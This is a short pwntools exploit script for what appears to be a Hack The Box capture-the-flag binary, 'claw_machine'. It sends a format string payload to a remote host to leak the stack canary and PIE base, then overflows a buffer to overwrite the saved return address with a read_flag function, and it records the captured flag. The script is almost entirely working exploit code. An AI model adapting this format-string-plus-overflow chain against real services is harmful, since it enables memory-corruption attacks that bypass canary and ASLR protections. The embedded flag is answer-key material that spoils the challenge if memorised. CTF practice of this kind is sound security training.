from pwn import *




context.log_level = "error"

'''
Mitigation:
CANARY
ASLR
PIE
FULL RELRO

Vulnerability 1:
format string :
the input length is enough to ask for canary and binary leak


Vulnerability 2:
buffer overflow in the feedback function

GOAL: 
leak canary+binary leak
calculate the address of read_flag and overwrite save RIP with it

'''


win_offset= 0x0000000000000b84

def call_flag():
    #p = process("./claw_machine_patched")
    p = remote('94.237.59.206',57715)
    p.sendlineafter(b'>>',b'9')
    p.sendlineafter(b'>>',b'y')
    p.recv(4096)
    p.recv(4096)
    # gdb.attach(p,gdbscript='''
    # b* fb+296        
    # ''')    
    payload = b'%25$p-%23$p'   # leak canary + binary address (main+52)
    print("payload: ", payload)
    p.sendline(payload)
    leak = p.recvuntil(b'Leave').split(b"feedback")[1].split(b"Leave")[0].split(b'-')
    canary= int(leak[0].strip().decode(),16)
    base_add = int(leak[1].strip().decode(),16) - 0x0000000000001552
    print("canary: ", hex(canary))
    print("base_add: ", hex(base_add))
    read_flag= base_add+win_offset
    


    overflow = b'A'*72 + p64(canary) + b'A'*8 + p64(read_flag)
    p.sendline(overflow)
    p.interactive()


# HTB{gr4b_th3_fl4g_w1th_fmt}

call_flag()